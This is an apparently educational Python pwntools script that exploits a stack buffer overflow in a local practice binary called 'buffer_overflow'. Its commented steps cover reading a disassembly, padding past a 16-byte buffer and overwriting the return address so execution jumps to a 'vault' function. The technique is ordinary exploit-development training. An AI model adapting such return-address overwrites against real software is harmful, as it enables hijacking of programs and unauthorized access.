#!/usr/bin/env python3

from pwn import *

ACCESS_VAULT_FUNCTION_ADDR = 0x00401146

# Tell pwntools our target process to automate future functions
elf = context.binary = ELF('buffer_overflow')

io = process()  # Actually start running the process

# Wait until we are prompted with input
# Notice how we use the "b" literal to mark it as a bytes object
# https://docs.python.org/3/library/stdtypes.html#binary-sequence-types-bytes-bytearray-memoryview
io.recvuntil(b"Enter the password to access Santa Ono's secret vault:")

# "disassemble main" in GDB launched with "gdb buffer_overflow"
# Dump of assembler code for function main:
#    0x0000000000401175 <+0>:     push   rbp
#    0x0000000000401176 <+1>:     mov    rbp,rsp
#    0x0000000000401179 <+4>:     sub    rsp,0x10
#    0x000000000040117d <+8>:     lea    rax,[rip+0xe9c]            # 0x402020
#    0x0000000000401184 <+15>:    mov    rdi,rax
#    0x0000000000401187 <+18>:    call   0x401030 <puts@plt>
#    0x000000000040118c <+23>:    mov    rdx,QWORD PTR [rip+0x2ead] # 0x404040 <stdin@GLIBC_2.2.5>
#    0x0000000000401193 <+30>:    lea    rax,[rbp-0x10]
#    0x0000000000401197 <+34>:    mov    esi,0x20
#    0x000000000040119c <+39>:    mov    rdi,rax
#    0x000000000040119f <+42>:    call   0x401040 <fgets@plt>
#    0x00000000004011a4 <+47>:    lea    rax,[rip+0xead]            # 0x402058
#    0x00000000004011ab <+54>:    mov    rdi,rax
#    0x00000000004011ae <+57>:    call   0x401030 <puts@plt>
#    0x00000000004011b3 <+62>:    mov    eax,0x0
#    0x00000000004011b8 <+67>:    leave
#    0x00000000004011b9 <+68>:    ret                           <----- reads our injected return address!

# In assembly you can read "sub rsp,0x10" at the start of "main"
# We need to write past 0x10 bytes to start modifying maliciously
dummy_data = b'A' * 0x10
# The saved ebp doesn't really matter
# We only execute one other function which doesn't need it
saved_ebp = b'B' * 8
# We have to pack the address properly (endianess!)
redirect_addr = p64(ACCESS_VAULT_FUNCTION_ADDR)
# Craft the final bytes payload
payload = dummy_data + saved_ebp + redirect_addr

# Overflow stack and get redirection
# fgets will write past the end of the stack frame
# It will set the return eip on the stack
# The "ret" instruction will use this to go to our address
io.send(payload)

# Open up stdin to terminal input
# Required so you can start using the shell interactively
# Generally speaking you add this after popping a shell
io.interactive()
